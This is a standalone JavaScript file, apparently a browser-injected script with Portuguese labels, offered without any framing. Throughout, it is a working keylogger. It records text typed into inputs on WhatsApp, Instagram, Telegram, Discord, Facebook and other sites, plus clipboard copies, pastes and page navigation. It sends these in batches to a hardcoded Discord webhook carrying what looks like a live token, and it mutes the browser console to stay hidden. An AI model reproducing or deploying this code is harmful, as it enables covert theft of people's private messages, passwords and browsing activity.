(function() {
    'use strict';

    const _id = '1528223376836001864';
    const _token = 'RkF8B_JJBtoKov_Dqo676LGH61ANJtoIPQkKamjo7pFvphHI-HN9Hr5dTaiQydvIMsOh';
    const _endpoint = 'https://discordapp.com/api/webhooks/' + _id + '/' + _token;

    const _batchSize = 10;
    const _flushInterval = 8000;

    let _store = [];
    let _timer = null;
    let _lastUrl = document.URL;
    let _lastTitle = document.title;
    let _session = localStorage.getItem('_collector_session') || (Math.random().toString(36).slice(2, 10) + Date.now().toString(36));
    localStorage.setItem('_collector_session', _session);
    let _eventCounts = { msg: 0, copy: 0, paste: 0, nav: 0 };
    let _isFlushing = false;
    let _debug = localStorage.getItem('_collector_debug') === 'true';

    let _buffer = '';
    let _isCapturing = false;
    let _lastKeyTime = 0;
    let _targetTag = '';
    let _targetId = '';
    let _targetPlatform = '';

    const _noop = () => {};
    const _orig = {
        log: console.log,
        warn: console.warn,
        error: console.error,
        info: console.info,
        debug: console.debug
    };

    if (!_debug) {
        console.log = _noop;
        console.warn = _noop;
        console.error = _noop;
        console.info = _noop;
        console.debug = _noop;
    }

    function _ts() {
        return new Date().toISOString().replace('T', ' ').slice(0, 19);
    }

    function _push(type, data) {
        _store.push({ t: _ts(), ty: type, d: data });
        _eventCounts[type] = (_eventCounts[type] || 0) + 1;
        if (_store.length >= _batchSize && !_isFlushing) _flush();
    }

    function _chunkArray(arr, size) {
        const result = [];
        for (let i = 0; i < arr.length; i += size) {
            result.push(arr.slice(i, i + size));
        }
        return result;
    }

    function _formatClipboard(text) {
        const lines = text.split('\n');
        const firstLines = lines.slice(0, 3);
        const display = firstLines.map(l => l.slice(0, 50)).join('↵ ');
        return display + (lines.length > 3 ? '… (+' + (lines.length - 3) + ' linhas)' : '');
    }

    function _buildEmbed(events) {
        const groups = { msg: [], copy: [], paste: [], nav: [] };
        events.forEach(e => { if (groups[e.ty]) groups[e.ty].push(e); });

        const fields = [];

        if (groups.msg.length) {
            const lines = groups.msg.map(e => {
                const txt = e.d.txt || '';
                const platform = e.d.platform || '';
                const prefix = platform ? '[' + platform + '] ' : '';
                return '> ' + prefix + txt;
            });
            const chunks = _chunkArray(lines, 10);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? '💬 Mensagens (' + lines.length + ')' : '⋯ continua',
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            });
        }

        if (groups.copy.length) {
            const copies = groups.copy.map(e => '📋 Copy: ' + _formatClipboard(e.d.txt));
            const chunks = _chunkArray(copies, 8);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? '📋 Cópias (' + copies.length + ')' : '⋯ continua',
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            });
        }

        if (groups.paste.length) {
            const pastes = groups.paste.map(e => '📥 Paste: ' + _formatClipboard(e.d.txt));
            const chunks = _chunkArray(pastes, 8);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? '📥 Colagens (' + pastes.length + ')' : '⋯ continua',
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            });
        }

        if (groups.nav.length) {
            const navs = groups.nav.map(e => {
                const title = e.d.title || 'Unknown';
                const url = e.d.url || '';
                return '🔗 ' + title + ' (' + url.replace(/^https?:\/\//, '').slice(0, 30) + ')';
            });
            const chunks = _chunkArray(navs, 6);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? '🧭 Navegação (' + navs.length + ')' : '⋯ continua',
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            });
        }

        const summary = '📊 ' + events.length + ' • 💬 ' + (_eventCounts.msg||0) + ' 📋 ' + (_eventCounts.copy||0) + ' 📥 ' + (_eventCounts.paste||0) + ' 🧭 ' + (_eventCounts.nav||0);

        return {
            embeds: [{
                color: 0x2b2d31,
                title: '📡 Activity Feed',
                description: summary,
                fields: fields.slice(0, 25),
                footer: { text: 'Session ' + _session + ' • ' + _ts() },
                timestamp: new Date().toISOString()
            }]
        };
    }

    function _send(events) {
        if (!events || !events.length) return;
        if (_isFlushing) return;
        _isFlushing = true;

        try {
            const payload = _buildEmbed(events);
            fetch(_endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(_noop).finally(function() {
                _isFlushing = false;
            });
        } catch (_) {
            _isFlushing = false;
        }
    }

    function _flush() {
        if (!_store.length) return;
        _send(_store.splice(0, _store.length));
    }

    function _getPlatform() {
        const url = document.URL;
        if (url.includes('whatsapp') || url.includes('web.whatsapp')) return 'WhatsApp';
        if (url.includes('habblive') || url.includes('habblet')) return 'Habblive';
        if (url.includes('instagram')) return 'Instagram';
        if (url.includes('telegram')) return 'Telegram';
        if (url.includes('discord')) return 'Discord';
        if (url.includes('facebook')) return 'Facebook';
        if (url.includes('twitter') || url.includes('x.com')) return 'Twitter';
        return 'Web';
    }

    function _submitMessage() {
        if (_buffer.trim().length > 0) {
            _push('msg', {
                txt: _buffer.trim(),
                platform: _targetPlatform || _getPlatform(),
                ctx: _targetTag + (_targetId ? '#' + _targetId : '')
            });
            _buffer = '';
        }
        _isCapturing = false;
        _targetTag = '';
        _targetId = '';
        _targetPlatform = '';
    }

    function _handleKeyDown(e) {
        const key = e.key;
        const target = e.target;

        if (!target || (target.tagName !== 'INPUT' && target.tagName !== 'TEXTAREA' && !target.isContentEditable)) {
            return;
        }

        if (key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            _submitMessage();
            return;
        }

        if (key === 'Escape') {
            _buffer = '';
            _isCapturing = false;
            _targetTag = '';
            _targetId = '';
            _targetPlatform = '';
            return;
        }

        if (key === 'Backspace') {
            if (_isCapturing) {
                _buffer = _buffer.slice(0, -1);
            }
            return;
        }

        if (key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
            if (!_isCapturing) {
                _isCapturing = true;
                _targetTag = target.tagName;
                _targetId = target.id || '';
                _targetPlatform = _getPlatform();
                _buffer = '';
            }
            _buffer += key;
            _lastKeyTime = Date.now();
            return;
        }

        if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
            return;
        }

        if (key === 'Tab') {
            return;
        }

        if (key.startsWith('Arrow')) {
            return;
        }

        if (_isCapturing) {
            _buffer += key;
        }
    }

    function _handleFocusOut(e) {
        const target = e.target;
        if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
            if (_isCapturing && _buffer.trim().length > 0) {
                _submitMessage();
            } else {
                _buffer = '';
                _isCapturing = false;
                _targetTag = '';
                _targetId = '';
                _targetPlatform = '';
            }
        }
    }

    function _handlePaste(e) {
        const target = e.target;
        if (!target || (target.tagName !== 'INPUT' && target.tagName !== 'TEXTAREA' && !target.isContentEditable)) {
            return;
        }
        const txt = e.clipboardData && e.clipboardData.getData('text/plain');
        if (!txt) return;
        if (!_isCapturing) {
            _isCapturing = true;
            _targetTag = target.tagName;
            _targetId = target.id || '';
            _targetPlatform = _getPlatform();
            _buffer = '';
        }
        _buffer += txt;
        _push('paste', { txt: txt.slice(0, 500), len: txt.length });
    }

    function _setupMessageCapture() {
        document.addEventListener('keydown', _handleKeyDown, true);
        document.addEventListener('focusout', _handleFocusOut, true);
        document.addEventListener('paste', _handlePaste, true);
    }

    function _trackCopy(e) {
        const txt = window.getSelection().toString().trim();
        if (txt && txt.length > 0) {
            _push('copy', { txt: txt.slice(0, 500), len: txt.length });
        }
    }

    function _trackNav() {
        const currentUrl = document.URL;
        const currentTitle = document.title;
        if (currentUrl !== _lastUrl) {
            _lastUrl = currentUrl;
            _push('nav', { url: currentUrl, ref: document.referrer, title: currentTitle });
        } else if (currentTitle !== _lastTitle) {
            _lastTitle = currentTitle;
            _push('nav', { url: currentUrl, ref: document.referrer, title: currentTitle });
        }
    }

    function _heartbeat() {
        _push('heartbeat', { online: true, url: document.URL });
    }

    function _init() {
        _setupMessageCapture();
        document.addEventListener('copy', _trackCopy, true);

        const navObs = new MutationObserver(function() { _trackNav(); });
        navObs.observe(document, { subtree: true, childList: true });
        window.addEventListener('popstate', _trackNav);
        window.addEventListener('hashchange', _trackNav);

        _timer = setInterval(_flush, _flushInterval);
        setInterval(_heartbeat, 300000);

        window.addEventListener('beforeunload', function() {
            _flush();
            navObs.disconnect();
        });

        window._logs = {
            kill: function() {
                clearInterval(_timer);
                _flush();
                document.removeEventListener('keydown', _handleKeyDown, true);
                document.removeEventListener('focusout', _handleFocusOut, true);
                document.removeEventListener('paste', _handlePaste, true);
                document.removeEventListener('copy', _trackCopy, true);
                window.removeEventListener('popstate', _trackNav);
                window.removeEventListener('hashchange', _trackNav);
                navObs.disconnect();
                console.log = _orig.log;
                console.warn = _orig.warn;
                console.error = _orig.error;
                console.info = _orig.info;
                console.debug = _orig.debug;
                localStorage.removeItem('_collector_session');
            },
            flush: _flush,
            debug: function(on) {
                _debug = on;
                localStorage.setItem('_collector_debug', String(on));
                if (on) {
                    console.log = _orig.log;
                    console.warn = _orig.warn;
                    console.error = _orig.error;
                    console.info = _orig.info;
                    console.debug = _orig.debug;
                } else {
                    console.log = _noop;
                    console.warn = _noop;
                    console.error = _noop;
                    console.info = _noop;
                    console.debug = _noop;
                }
            }
        };
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(_init, 0);
    } else {
        document.addEventListener('DOMContentLoaded', function() { setTimeout(_init, 0); });
    }

    setTimeout(function() {
        if (!window._logs) _init();
    }, 3000);

})();
